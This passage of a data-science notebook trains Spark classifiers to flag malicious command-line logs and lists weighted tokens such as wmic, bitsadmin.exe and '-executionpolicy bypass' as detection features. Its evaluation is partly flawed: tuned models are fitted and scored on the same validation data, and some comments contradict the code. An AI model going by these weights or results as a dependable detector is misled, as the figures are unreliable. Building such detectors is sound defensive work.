  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>application</td>\n",
       "      <td>-0.492389</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>chrome.exe</td>\n",
       "      <td>-0.491002</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>program</td>\n",
       "      <td>-0.490695</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>files</td>\n",
       "      <td>-0.490695</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>x86</td>\n",
       "      <td>-0.485431</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>120</th>\n",
       "      <td>-servername</td>\n",
       "      <td>-0.428959</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>47</th>\n",
       "      <td>-k</td>\n",
       "      <td>-0.414800</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>--type</td>\n",
       "      <td>-0.343134</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>65</th>\n",
       "      <td>start_browser.ps1</td>\n",
       "      <td>-0.340685</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>-forcev1</td>\n",
       "      <td>-0.333568</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>0xffffffff</td>\n",
       "      <td>-0.333568</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>conhost.exe</td>\n",
       "      <td>-0.333568</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>46</th>\n",
       "      <td>documents</td>\n",
       "      <td>-0.328703</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>40</th>\n",
       "      <td>svchost.exe</td>\n",
       "      <td>-0.240684</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>-noexit</td>\n",
       "      <td>-0.239043</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>google</td>\n",
       "      <td>-0.201593</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>262</th>\n",
       "      <td>-embedding</td>\n",
       "      <td>-0.180886</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>247</th>\n",
       "      <td>programdata</td>\n",
       "      <td>-0.173344</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>74</th>\n",
       "      <td>-p</td>\n",
       "      <td>-0.172374</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>173</th>\n",
       "      <td>ngen.exe</td>\n",
       "      <td>-0.160427</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                 token    weight\n",
       "5          application -0.492389\n",
       "6           chrome.exe -0.491002\n",
       "2              program -0.490695\n",
       "3                files -0.490695\n",
       "4                  x86 -0.485431\n",
       "120        -servername -0.428959\n",
       "47                  -k -0.414800\n",
       "7               --type -0.343134\n",
       "65   start_browser.ps1 -0.340685\n",
       "30            -forcev1 -0.333568\n",
       "31          0xffffffff -0.333568\n",
       "29         conhost.exe -0.333568\n",
       "46           documents -0.328703\n",
       "40         svchost.exe -0.240684\n",
       "42             -noexit -0.239043\n",
       "1               google -0.201593\n",
       "262         -embedding -0.180886\n",
       "247        programdata -0.173344\n",
       "74                  -p -0.172374\n",
       "173           ngen.exe -0.160427"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "en_lr_word_coefs.sort_values('weight', ascending=True).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# LR Model Tuning\n",
    "\n",
    "+ Perform grid-search over TF-IDF and regularization parameters\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[PipelineModel_cd02adf098d5,\n",
       " StandardScaler_9da5e20caf3d,\n",
       " VectorAssembler_a7b97ad71b4d,\n",
       " LogisticRegressionModel: uid = LogisticRegression_1271876c8153, numClasses = 2, numFeatures = 2001]"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "en_lr_estimator.stages"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [],
   "source": [
    "paramGrid = (ParamGridBuilder() \n",
    "                 .addGrid(en_lr_pipeline.stages[3].regParam, [0.0, 0.01, 0.02]) \n",
    "                 .addGrid(en_lr_pipeline.stages[3].elasticNetParam, [0.0, 0.2, 0.4]) \n",
    "                 .build()\n",
    "            )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ Loop over each parameter mapping in paramGrid and fit model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fitting model 0\n",
      "Fitting model 1\n",
      "Fitting model 2\n",
      "Fitting model 3\n",
      "Fitting model 4\n",
      "Fitting model 5\n",
      "Fitting model 6\n",
      "Fitting model 7\n",
      "Fitting model 8\n"
     ]
    }
   ],
   "source": [
    "lr_models = []\n",
    "for g in range(len(paramGrid)):\n",
    "    print(\"Fitting model {}\".format(g))\n",
    "    _model = en_lr_pipeline.fit(validation_df, paramGrid[g])\n",
    "    lr_models.append(_model)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ Get the AUC score for each model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "evaluator = BinaryClassificationEvaluator(labelCol='class_label', metricName='areaUnderROC')\n",
    "lr_auc_scores = [evaluator.evaluate(model.transform(validation_df)) for model in lr_models]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best params: \n",
      "\n",
      "{Param(parent='LogisticRegression_1271876c8153', name='regParam', doc='regularization parameter (>= 0)'): 0.0, Param(parent='LogisticRegression_1271876c8153', name='elasticNetParam', doc='the ElasticNet mixing parameter, in range [0, 1]. For alpha = 0, the penalty is an L2 penalty. For alpha = 1, it is an L1 penalty'): 0.4}\n",
      "\n",
      "Best Validation AUC: \n",
      "\n",
      "0.999865666834375\n"
     ]
    }
   ],
   "source": [
    "lr_best_model_idx = np.argmax(lr_auc_scores)\n",
    "lr_best_model = lr_models[lr_best_model_idx]\n",
    "print(\"Best params: \\n\\n{}\\n\".format(paramGrid[lr_best_model_idx]))\n",
    "print(\"Best Validation AUC: \\n\\n{}\".format(lr_auc_scores[lr_best_model_idx]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## LR best model\n",
    "+ regParam: 0.0\n",
    "+ elasticNet: 0.4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Examine the coefficients of the `best model` to determine how well it learned the weights for the tokens\n",
    "+ optimizing the regularization parameters drastically changed the learned weights"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "-293.6955348296553"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lr_best_model.stages[-1].intercept"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "best_coefs = lr_best_model.stages[-1].coefficients.toArray()\n",
    "best_vocab = lr_best_model.stages[0].stages[0].vocabulary\n",
    "best_model_word_coefs = pd.DataFrame({'token': best_vocab, 'weight': best_coefs})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>token</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>257</th>\n",
       "      <td>wmic</td>\n",
       "      <td>48.974631</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>162</th>\n",
       "      <td>net</td>\n",
       "      <td>47.091766</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>279</th>\n",
       "      <td>query</td>\n",
       "      <td>44.957191</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>206</th>\n",
       "      <td>/t</td>\n",
       "      <td>40.601034</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>193</th>\n",
       "      <td>-name</td>\n",
       "      <td>35.059946</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>328</th>\n",
       "      <td>wmic.exe</td>\n",
       "      <td>34.132530</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>201</th>\n",
       "      <td>reg</td>\n",
       "      <td>33.381022</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>222</th>\n",
       "      <td>path</td>\n",
       "      <td>30.431450</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>110</th>\n",
       "      <td>bypass</td>\n",
       "      <td>29.986377</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>115</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>29.894707</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>714</th>\n",
       "      <td>net.exe</td>\n",
       "      <td>28.847282</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>320</th>\n",
       "      <td>.zip</td>\n",
       "      <td>28.445609</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>913</th>\n",
       "      <td>bitsadmin.exe</td>\n",
       "      <td>27.326623</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>197</th>\n",
       "      <td>-force</td>\n",
       "      <td>26.057829</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>828</th>\n",
       "      <td>-command</td>\n",
       "      <td>25.948482</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>726</th>\n",
       "      <td>test</td>\n",
       "      <td>24.423041</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>265</th>\n",
       "      <td>get-childitem</td>\n",
       "      <td>23.873316</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>850</th>\n",
       "      <td>-computername</td>\n",
       "      <td>23.099790</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>480</th>\n",
       "      <td>dir</td>\n",
       "      <td>22.452022</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>109</th>\n",
       "      <td>-c</td>\n",
       "      <td>21.688419</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                token     weight\n",
       "257              wmic  48.974631\n",
       "162               net  47.091766\n",
       "279             query  44.957191\n",
       "206                /t  40.601034\n",
       "193             -name  35.059946\n",
       "328          wmic.exe  34.132530\n",
       "201               reg  33.381022\n",
       "222              path  30.431450\n",
       "110            bypass  29.986377\n",
       "115  -executionpolicy  29.894707\n",
       "714           net.exe  28.847282\n",
       "320              .zip  28.445609\n",
       "913     bitsadmin.exe  27.326623\n",
       "197            -force  26.057829\n",
       "828          -command  25.948482\n",
       "726              test  24.423041\n",
       "265     get-childitem  23.873316\n",
       "850     -computername  23.099790\n",
       "480               dir  22.452022\n",
       "109                -c  21.688419"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "best_model_word_coefs.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# LR Cross Validation\n",
    "+ test best_model performance on training dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "testing_df = clean_input1(testing_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Testing AUC: \n",
      "\n",
      "0.9834943\n"
     ]
    }
   ],
   "source": [
    "testing_auc = evaluator.evaluate(lr_best_model.transform(testing_df))\n",
    "print(\"Testing AUC: \\n\\n{}\".format(round(testing_auc,7)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "lr_best_model_df = lr_best_model.transform(testing_df)\n",
    "tp = lr_best_model_df.filter((lr_best_model_df.class_label == 1) & (lr_best_model_df.prediction == 1)).count()\n",
    "tn = lr_best_model_df.filter((lr_best_model_df.class_label == 0) & (lr_best_model_df.prediction == 0)).count()\n",
    "fp = lr_best_model_df.filter((lr_best_model_df.class_label == 0) & (lr_best_model_df.prediction == 1)).count()\n",
    "fn = lr_best_model_df.filter((lr_best_model_df.class_label == 1) & (lr_best_model_df.prediction == 0)).count()\n",
    "recall = tp / (tp + fn)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0.9634146341463414"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "recall"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>predicted_0</th>\n",
       "      <th>predicted_1</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>actual_0</th>\n",
       "      <td>5128</td>\n",
       "      <td>21</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>actual_1</th>\n",
       "      <td>6</td>\n",
       "      <td>158</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          predicted_0  predicted_1\n",
       "actual_0         5128           21\n",
       "actual_1            6          158"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pd.DataFrame(data=[[tn,fp],[fn,tp]], index=['actual_0', 'actual_1'], columns=['predicted_0', 'predicted_1'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### A malicious log classified as benign (false negative) is the worst case scenario for this domain, therefore, recall is the metric used to evaluate the model because the recall metric measures the true positive rate"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Random Forest Modeling\n",
    "---"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Data engineering pipelines \n",
    "+ Term Frequency (one-hot): value indicates if feature is present in observation\n",
    "+ Feature has to be present at least once in dataset and in at least 50 documents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [],
   "source": [
    "cv_transformer = feature.CountVectorizer(minTF=1, minDF=5, binary=True, inputCol='cmd_line_tokens', outputCol='tf')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "estimator = Pipeline(stages=[cv_transformer]).fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "+-----------------------------------------------------------------------------------+--------------------------------------------------------------------------+\n",
      "|cmd_line_tokens                                                                    |tf                                                                        |\n",
      "+-----------------------------------------------------------------------------------+--------------------------------------------------------------------------+\n",
      "|[-c, -s, -f, -t, empty, -m, empty, -a, -u, empty]                                  |(1561,[12,76,189,236,574,622,676,1032],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[-c, -s, -f, -t, empty, -m, empty, -a, -u, empty]                                  |(1561,[12,76,189,236,574,622,676,1032],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[-c, -s, -f, -t, empty, -m, empty, -a, -u, empty]                                  |(1561,[12,76,189,236,574,622,676,1032],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0]) |\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]                |(1561,[120,996,1008],[1.0,1.0,1.0])                                       |\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]                |(1561,[120,996,1008],[1.0,1.0,1.0])                                       |\n",
      "|[backgroundtransferhost.exe, -servername, backgroundtransferhost.1]                |(1561,[120,996,1008],[1.0,1.0,1.0])                                       |\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "|[program, files, x86, google, chrome, application, chrome.exe, --, https, cnn.com/]|(1561,[0,1,2,3,4,5,6,18,50,152],[1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0,1.0])|\n",
      "+-----------------------------------------------------------------------------------+--------------------------------------------------------------------------+\n",
      "only showing top 20 rows\n",
      "\n"
     ]
    }
   ],
   "source": [
    "estimator.transform(training_df).select('cmd_line_tokens','tf').sample(.2).show(20, False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1561"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(estimator.stages[0].vocabulary)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [],
   "source": [
    "rf = RandomForestClassifier(featuresCol='tf', labelCol='class_label', maxDepth=6, numTrees=100, \n",
    "                            featureSubsetStrategy='sqrt', impurity='gini', seed=0)\n",
    "rf_estimator = Pipeline(stages=[cv_transformer, rf])\n",
    "rf_model = rf_estimator.fit(training_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Row(accuracy=0.8115942028985508)"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "rf_model.transform(testing_df).\\\n",
    "    select(F.avg(F.expr('float(class_label = prediction)')).alias('accuracy')).\\\n",
    "    first()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DecisionTreeClassificationModel (uid=dtc_b7edb91ab7ab) of depth 6 with 13 nodes\n",
      "  If (feature 13 <= 0.5)\n",
      "   If (feature 6 <= 0.5)\n",
      "    If (feature 193 <= 0.5)\n",
      "     If (feature 418 <= 0.5)\n",
      "      If (feature 30 <= 0.5)\n",
      "       If (feature 87 <= 0.5)\n",
      "        Predict: 1.0\n",
      "       Else (feature 87 > 0.5)\n",
      "        Predict: 0.0\n",
      "      Else (feature 30 > 0.5)\n",
      "       Predict: 0.0\n",
      "     Else (feature 418 > 0.5)\n",
      "      Predict: 0.0\n",
      "    Else (feature 193 > 0.5)\n",
      "     Predict: 0.0\n",
      "   Else (feature 6 > 0.5)\n",
      "    Predict: 0.0\n",
      "  Else (feature 13 > 0.5)\n",
      "   Predict: 1.0\n",
      "\n"
     ]
    }
   ],
   "source": [
    "print(rf_model.stages[-1].trees[3].toDebugString)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### RF Inference"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ The tokens with the most importance all indicate a malicious log and are very similar to the tokens identified in the LR model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>vocab</th>\n",
       "      <th>weight</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>chrome</td>\n",
       "      <td>0.094420</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>files</td>\n",
       "      <td>0.072146</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>application</td>\n",
       "      <td>0.067458</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>program</td>\n",
       "      <td>0.066213</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>chrome.exe</td>\n",
       "      <td>0.064263</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>--type</td>\n",
       "      <td>0.062808</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>x86</td>\n",
       "      <td>0.046605</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>renderer</td>\n",
       "      <td>0.041698</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>bypass</td>\n",
       "      <td>0.034118</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>-executionpolicy</td>\n",
       "      <td>0.033992</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>google</td>\n",
       "      <td>0.032091</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>-c</td>\n",
       "      <td>0.027699</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>select-object</td>\n",
       "      <td>0.013434</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>35</th>\n",
       "      <td>reg</td>\n",
       "      <td>0.012040</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>foreach</td>\n",
       "      <td>0.011511</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>-forcev1</td>\n",
       "      <td>0.011097</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>0xffffffff</td>\n",
       "      <td>0.010474</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>81</th>\n",
       "      <td>net</td>\n",
       "      <td>0.009294</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>39</th>\n",
       "      <td>-path</td>\n",
       "      <td>0.008543</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>38</th>\n",
       "      <td>/c</td>\n",
       "      <td>0.008385</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "               vocab    weight\n",
       "0             chrome  0.094420\n",
       "2              files  0.072146\n",
       "5        application  0.067458\n",
       "3            program  0.066213\n",
       "6         chrome.exe  0.064263\n",
       "7             --type  0.062808\n",
       "4                x86  0.046605\n",
       "8           renderer  0.041698\n",
       "11            bypass  0.034118\n",
       "13  -executionpolicy  0.033992\n",
       "1             google  0.032091\n",
       "12                -c  0.027699\n",
       "22     select-object  0.013434\n",
       "35               reg  0.012040\n",
       "26           foreach  0.011511\n",
       "30          -forcev1  0.011097\n",
       "29        0xffffffff  0.010474\n",
       "81               net  0.009294\n",
       "39             -path  0.008543\n",
       "38                /c  0.008385"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "vocab = rf_model.stages[0].vocabulary\n",
    "feature_importance = rf_model.stages[-1].featureImportances.toArray()\n",
    "vocab_importance_df = pd.DataFrame({'vocab': vocab, 'weight': feature_importance})\n",
    "vocab_importance_df.sort_values('weight', ascending=False).head(20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# RF Model Tuning\n",
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [],
   "source": [
    "paramGrid = (ParamGridBuilder() \n",
    "                 .addGrid(rf_model.stages[0].minDF, [3,5,10]) \n",
    "                 .addGrid(rf_model.stages[1].numTrees, [300,400,500]) \n",
    "                 .addGrid(rf_model.stages[1].maxDepth, [10,15,20])\n",
    "                 .build()\n",
    "            )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fitting model 0\n",
      "Fitting model 1\n",
      "Fitting model 2\n",
      "Fitting model 3\n",
      "Fitting model 4\n",
      "Fitting model 5\n",
      "Fitting model 6\n",
      "Fitting model 7\n",
      "Fitting model 8\n",
      "Fitting model 9\n",
      "Fitting model 10\n",
      "Fitting model 11\n",
      "Fitting model 12\n",
      "Fitting model 13\n",
      "Fitting model 14\n",
      "Fitting model 15\n",
      "Fitting model 16\n",
      "Fitting model 17\n",
